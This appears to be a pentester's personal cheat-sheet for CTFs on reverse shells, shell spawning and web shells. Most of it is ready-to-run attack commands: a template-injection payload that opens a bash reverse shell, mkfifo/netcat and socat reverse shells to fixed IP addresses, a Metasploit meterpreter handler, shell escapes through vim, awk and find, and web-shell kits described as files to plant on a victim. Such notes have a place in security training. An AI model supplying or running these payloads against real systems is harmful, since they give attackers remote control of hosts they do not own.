
```embed
title: "Online - Reverse Shell Generator"
image: "https://user-images.githubusercontent.com/58673953/111243529-9d646f80-85d7-11eb-986c-9842747dc2e7.png"
description: "Online Reverse Shell generator with Local Storage functionality, URI & Base64 Encoding, MSFVenom Generator, and Raw Mode. Great for CTFs."
url: "https://www.revshells.com/"
```

```php
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
```

Start meterpreter listener Kali MSF
#rev_shell
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST
set LPORT

exploit
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001 >/tmp/f

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001  | tee -a monitor.sh

```

## OS Shells
#Helpful 
#### Lua To Shell

Spawning Interactive Shells

```shell
lua: os.execute('/bin/sh')
```


#### Ruby To Shell

Spawning Interactive Shells

```shell
ruby: exec "/bin/sh"
```

#### Perl To Shell

Spawning Interactive Shells

```shell
perl —e 'exec "/bin/sh";'
```

Spawning Interactive Shells

```shell
perl: exec "/bin/sh";
```

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

#### Interactive

Spawning Interactive Shells

```shell
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

#### AWK To Shell

Spawning Interactive Shells

```shell
awk 'BEGIN {system("/bin/sh")}'
```

#### Using Find For A Shell

Spawning Interactive Shells

```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
```shell
find . -exec /bin/sh \; -quit
```

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

Spawning Interactive Shells

```shell
vim -c ':!/bin/sh'
```

#### Vim Escape

Spawning Interactive Shells

```shell
vim
:set shell=/bin/sh
:shell
```

---
## Web Shells

---
#### Laudanum
Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.
#Helpful [[Web Basics]] [[File_Transfering]]
```shell
$ ls /usr/share/laudanum           
asp  aspx  cfm  helpers  jsp  php  wordpress
```

## Antak Webshell

Antak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest.
```bash
$ ls /usr/share/nishang 
```

### Shell Generation and Preconfigured Links

Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.

## Staged vs Stageless
[[MetaSploit]] [[MSFVenom]] 
- _Staged_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task. **Look for the seperating / for staged payloads**
- _Stageless_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener. **Look for the _ in the payload name for Stageless**


### **Socat OpenSSL Help**
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:/bin/bash

socat OPENSSL::10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

